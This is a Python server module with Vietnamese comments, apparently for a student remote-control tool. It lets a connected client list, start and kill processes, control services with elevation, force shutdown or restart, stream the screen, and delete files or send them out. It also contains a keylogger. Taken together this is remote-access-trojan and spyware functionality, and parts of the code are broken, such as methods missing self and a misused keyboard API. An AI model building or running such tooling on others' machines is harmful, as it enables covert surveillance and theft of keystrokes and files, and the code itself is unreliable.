# SV_model.py

import os
import random
import socket
import subprocess
import threading
from vidstream import StreamingServer

import keyboard

class SV_Model:
    def __init__(self, server_ip, port):
        self.server_ip = server_ip
        self.port = port
        self.server_socket = None
        self.running = False

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((self.server_ip, self.port))
            self.server_socket.listen(3)
            print(f"Server is listening on: {self.server_ip}:{self.port}")
            return True
        except Exception as e:
            print(f"Error while starting server: {e}")
            return False

    def accept_client(self):
        try:
            self.client_socket, addr = self.server_socket.accept()
            return self.client_socket, addr
        except Exception as e:
            print(f"Error while accepting client: {e}")
            return None, None

    def close_server(self):
        if self.server_socket:
            self.server_socket.close()  # Đóng socket của server
            print("Server stopped.")
        self.server_socket = None  # Đảm bảo server_socket không còn giá trị sau khi dừng
        
    ##Class cho network
    def check_ip_address_valid(ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    
    def check_port_valid(port):
        if 0 < int(port) <= 65535:
            return True
        else:
            return False
        
    def send_command(self, socket, command):
        """Gửi câu lệnh từ client/server đến server/client"""
        socket.sendall(command.encode())
    
    def receive_response(self, socket, buffer_size=65535):
        """Nhận phản hồi từ server/client"""
        return socket.recv(buffer_size).decode()
    
    #1. SV_App_Process:    
    def list_apps_running(self):
        """Lấy danh sách ứng dụng đang chạy từ hệ thống"""
        try:
            # Lấy danh sách ứng dụng đang chạy từ hệ thống
            output = subprocess.check_output("tasklist", encoding='utf-8')  # Ensure UTF-8 encoding
            print(f"Server output: {output}")  # Debugging line
            return output  # Trả lại kết quả cho controller
        except Exception as e:
            return str(e)  # Nếu có lỗi, trả về thông báo lỗi

    # Start app by path
    # 
    # def start_app_by_path(app_path):
    #     """Khởi động ứng dụng từ đường dẫn"""
    #     if not os.path.isfile(app_path):
    #         return f"Path '{app_path}' does not exist."
    #     try:
    #         subprocess.Popen([app_path], shell=True)
    #         return f"Started application: {app_path}"
    #     except Exception as e:
    #         return f"Error starting application: {str(e)}"
    
    def start_app_by_name(self, app_name):
        """Khởi động ứng dụng theo tên"""
        try:
            # Sử dụng lệnh start để khởi động ứng dụng theo tên (có thể bao gồm đường dẫn nếu cần)
            subprocess.run(["start", app_name], check=True, shell=True)
            return f"Started application with name {app_name}."
        except Exception as e:
            return f"Error starting application with name {app_name}: {str(e)}"
    
    
    def stop_app_by_pid(self, pid):
        """Dừng ứng dụng theo PID"""
        try:
            subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
            return f"Stopped application with PID {pid}."
        except Exception as e:
            return f"Error stopping application with PID {pid}: {str(e)}"   

    
    def clear_tree(treeview):
        """Xóa tất cả các mục trong Treeview"""
        for item in treeview.get_children():
            treeview.delete(item)

    #2. SV_Services:
    
    def list_running_services():
        command = "Get-Service | Where-Object { $_.Status -eq 'Running' } | Format-Table -HideTableHeaders -Property Name,DisplayName"
        return SV_Model.run_powershell_command(command)

    
    def start_service(service_name):
        command = f"Start-Process sc.exe -ArgumentList 'start', '{service_name}' -Verb runAs"
        return SV_Model.run_powershell_command(command)

    
    def stop_service(service_name):
        command = f"Start-Process sc.exe -ArgumentList 'stop', '{service_name}' -Verb runAs"
        return SV_Model.run_powershell_command(command)

    #3. SV_Shutdown:
    
    def shutdown_server():
        try:
            SV_Model.run_powershell_command("Stop-Computer -Force")
            return "Server is shutting down..."
        except Exception as e:
            return f"Khong the shutdown server: {e}"

    
    def reset_server():
        try:
            SV_Model.run_powershell_command("Restart-Computer -Force")
            return "Server is reset..."
        except Exception as e:
            return f"Khong the reset server: {e}"

    #4. SV_ScreenShare:
    
    def start_screen_sharing(client_ip, client_port):
        # Tạo đối tượng client chia sẻ màn hình và bắt đầu stream
        client_view_stream = StreamingServer.ScreenShareClient(client_ip, client_port)
        stream_thread = threading.Thread(target=client_view_stream.start_stream)
        stream_thread.start()
        return client_view_stream, stream_thread

    
    def stop_screen_sharing(client_view_stream):
        # Dừng việc chia sẻ màn hình
        client_view_stream.stop_stream()
        return "Screen sharing stopped."

    #5. SV_Keylogger:
    
    def start_keylogger():
        keys_pressed = ""
        MAX_LINE_LENGTH = 50
        stop_keylogger = False
        listener = None

        def on_press(key):
            nonlocal keys_pressed, stop_keylogger
            if stop_keylogger:
                return False

            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = f' {str(key)} '

            if key == keyboard.Key.enter:
                keys_pressed = ""
            else:
                keys_pressed += key_str

            return key_str

        listener = keyboard.Listener(on_press=on_press)
        listener.start()

        return listener

    
    def stop_keylogger(listener):
        listener.stop()
        return "KEYLOGGER_STOPPED"
    #6. SV_Del_Copy:
    
    def delete_file(client_socket, file_path):
    # Xóa file tại đường dẫn được chỉ định trên server.
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                return f"Xoa file thanh cong."
            except Exception as e:
                return f"Loi: xoa file: {e}"
        else:
            return f"File khong ton tai tren may Server."  
        
    
    def copy_file(client_socket, file_path):
        #Sao chép file tại đường dẫn được chỉ định trên server và gửi tới client.
        if os.path.exists(file_path):        
            # Lấy kích thước file
            file_size = os.path.getsize(file_path)
            
            # Gửi kích thước file đến client
            client_socket.sendall(file_size.to_bytes(4, byteorder='big'))
            
            # Gửi file tới client
            with open(file_path, 'rb') as f:
                while (chunk := f.read(65535)):
                    client_socket.sendall(chunk)
        else:
            # Nếu file không tồn tại, gửi kích thước 0 để báo lỗi
            client_socket.sendall((0).to_bytes(4, byteorder='big'))